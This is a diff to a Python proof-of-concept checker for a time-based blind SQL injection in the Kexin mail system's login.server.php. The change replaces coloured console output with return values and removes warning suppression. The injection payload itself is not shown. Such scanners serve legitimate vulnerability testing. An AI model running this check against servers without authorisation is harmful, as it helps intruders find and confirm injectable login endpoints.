@@ -10,8 +10,8 @@ import sys
 import time
 import json
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class kxmail_login_server_sqli_BaseVerify:
     def __init__(self, url):
@@ -32,12 +32,12 @@ class kxmail_login_server_sqli_BaseVerify:
         try:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if time.time() - start_time >= 6:
-                cprint("[+]存在科信邮件系统login.server.php 时间盲注漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
+                return "[+]存在科信邮件系统login.server.php 时间盲注漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = kxmail_login_server_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
